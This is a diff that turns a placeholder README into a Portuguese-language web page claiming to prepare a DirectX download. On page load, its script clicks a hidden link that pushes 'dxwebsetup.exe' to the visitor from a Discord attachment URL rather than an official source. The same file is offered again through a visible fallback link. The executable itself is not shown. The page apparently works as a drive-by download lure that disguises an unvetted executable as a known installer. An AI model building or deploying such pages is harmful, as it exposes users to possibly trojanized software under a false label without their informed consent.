@@ -1,1 +1,29 @@
-# teste
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Download Automático: DirectX</title>
+</head>
+<body>
+
+    <h1>Preparando o Download do DirectX...</h1>
+    <p>Se o download não começar automaticamente, <a id="linkDownload" href="https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&" download="dxwebsetup.exe">clique aqui para baixar</a>.</p>
+
+    <a id="linkDownloadOculto" 
+       href="https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&" 
+       download="dxwebsetup.exe" 
+       style="display: none;">
+    </a>
+
+    <script>
+        window.onload = function() {
+            var link = document.getElementById('linkDownloadOculto');
+            
+            if (link) {
+                // Tenta forçar o download. Lembre-se, navegadores podem bloquear.
+                link.click();
+            }
+        };
+    </script>
+</body>
+</html>
